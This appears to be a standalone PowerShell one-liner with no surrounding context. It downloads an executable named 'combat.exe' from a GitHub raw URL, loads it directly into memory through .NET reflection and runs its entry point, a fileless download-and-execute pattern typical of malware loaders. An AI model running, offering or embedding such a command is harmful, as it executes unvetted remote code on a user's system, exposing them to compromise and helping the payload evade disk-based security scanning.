[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/mathsencud-creator/rs/raw/main/combat.exe").Content).EntryPoint.Invoke($null, $null)

